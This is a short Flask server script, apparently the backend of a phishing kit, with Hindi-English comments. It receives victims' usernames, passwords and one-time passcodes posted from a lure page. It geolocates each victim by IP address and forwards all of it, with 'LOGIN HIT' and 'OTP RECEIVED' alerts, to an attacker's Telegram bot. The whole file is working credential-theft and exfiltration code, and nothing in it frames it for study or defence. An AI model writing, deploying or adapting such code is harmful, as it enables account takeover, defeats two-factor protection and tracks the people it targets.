from flask import Flask, request, jsonify
import requests
import os

app = Flask(__name__)

TOKEN = os.environ.get('BOT_TOKEN')
CID = os.environ.get('CHAT_ID')

@app.route('/api/index', methods=['POST'])
def track_target():
    data = request.get_json(force=True)
    dtype = data.get('t')
    
    # Target ka IP address lena
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    
    # IP se Location nikalna
    geo = requests.get(f"http://ip-api.com/json/{ip}").json()
    city = geo.get('city', 'Unknown')
    isp = geo.get('isp', 'Unknown')

    if dtype == 'VISIT_ALERT':
        msg = f"👀 **LINK OPENED!**\n\n📍 City: `{city}`\n🌐 Network: `{isp}`\n📱 Device: `{data.get('device')[:50]}...`"
    elif dtype == 'OTP':
        msg = f"🔢 **OTP RECEIVED!**\nUser: `{data.get('u')}`\nCode: `{data.get('o')}`"
    else:
        msg = f"👤 **LOGIN HIT**\nUser: `{data.get('u')}`\nPass: `{data.get('p')}`\n📍 Loc: `{city}`"

    requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", json={"chat_id": CID, "text": msg, "parse_mode": "Markdown"})
    return jsonify({"s": "ok"})

def handler(req, res):
    return app(req, res)
    
